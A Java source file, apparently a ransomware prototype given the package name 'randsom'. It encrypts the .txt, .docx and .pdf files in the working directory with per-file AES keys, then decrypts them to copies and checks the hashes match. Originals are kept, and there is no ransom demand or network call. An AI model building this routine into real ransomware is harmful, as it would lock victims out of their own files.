package randsom;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;

import javax.swing.event.ListSelectionEvent;


public class fileReader {
	
	static chiper c;
	private static String aesKeyString;
	
	public static void main(String args[]) {
		
		c = new chiper();
		//rsaKeysGen();
			
		HashSet<String> types = new HashSet<>(Arrays.asList("txt", "docx", "pdf"));
		
		ArrayList<byte[]> filehashes = new ArrayList<>();
		
		File dir;
		try {
			
			dir = new File(System.getProperty("user.dir"));
			DataInputStream reader;
			DataOutputStream writer;
			MessageDigest hash = MessageDigest.getInstance("SHA-256");
			File[] files = dir.listFiles();
			for(File f : files) {
				if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					
					if(types.contains(ext)) {
						reader = new DataInputStream(new FileInputStream(f));
						int size = reader.available();
						byte[] data = new byte[size];
						reader.read(data);
						c.aesKeyGen();
						byte[] edata = c.encrypt(data);
						
						filehashes.add(hash.digest(data));
						reader.close();
						
						writer = new DataOutputStream( new FileOutputStream("e" + fileName));
						writer.write(c.getencrpytAESKey());
						writer.write(c.getIV());
						writer.write(edata);
						writer.flush();
						writer.close();
						
					}
				}
			}
				
			
		}
		catch(Exception ex) {}
		
		try {
			
			dir = new File(System.getProperty("user.dir"));
			DataInputStream reader;
			DataOutputStream writer;
			File[] files = dir.listFiles();
			MessageDigest hash = MessageDigest.getInstance("SHA-256");
			for(File f : files) {
				if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					
					if(fileName.charAt(0) == 'e' && types.contains(ext)) {
						reader = new DataInputStream(new FileInputStream(f));
						int size = reader.available();
						byte[] aeskey = new byte[128];
						byte[] IV = new byte[16];
						byte[] data = new byte[size - 144];
						
						reader.read(aeskey, 0, 128);
						reader.read(IV, 0, 16);
						reader.read(data, 0, size - 144);
						c.setIV(IV);
						c.decrpytAESKey(aeskey);
						byte[] edata = c.decrypt(data);
						
						filehashes.add(hash.digest(edata));
						reader.close();
						
						writer = new DataOutputStream( new FileOutputStream( "u" + fileName.substring(1)));
						
						writer.write(edata);
						writer.flush();
						writer.close();
						
					}
				}
			}
		}catch(Exception ex) {}
		
		int size = filehashes.size() /2 ;
		for(int i = 0; i < size; i++) {
			System.out.println( Arrays.equals(filehashes.get(i), filehashes.get(i + size) ) );
		}
		
	}
}
